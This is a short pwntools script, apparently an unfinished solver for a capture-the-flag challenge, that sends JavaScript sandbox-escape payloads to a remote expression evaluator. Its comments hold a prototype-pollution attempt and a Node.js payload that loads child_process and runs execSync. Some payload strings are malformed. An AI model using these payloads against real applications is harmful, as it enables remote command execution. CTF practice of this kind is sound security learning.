from pwn import *

context.terminal =  ["tmux", "splitw", "-h"] 
BINARY = "./chal.js"
HOST = "climb.2024-bq.ctfcompetition.com"
PORT = 1337

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start_binary()
print(p.recvuntil(b":\n").decode())
payload = b"o = constructor['constructor]'"
# f() = (obj = ["__proto__"]; obj["__proto__"]["polluted"]); f()
# payload += b"o"
# o = constructor["constructpr"]; o
# "return global.process.mainModule.constructor._load(`child_process`).execSync(`id`).toString()"; f()
p.sendline(b'f(p) = join(".", p); a = f(["constructor", "__proto__"]); a["constructor"]')
print(p.recv().decode())
#  o["assign"](o, o["getOwnPropertyDescriptor"](o["getPrototypeOf"](toString), "constructor"));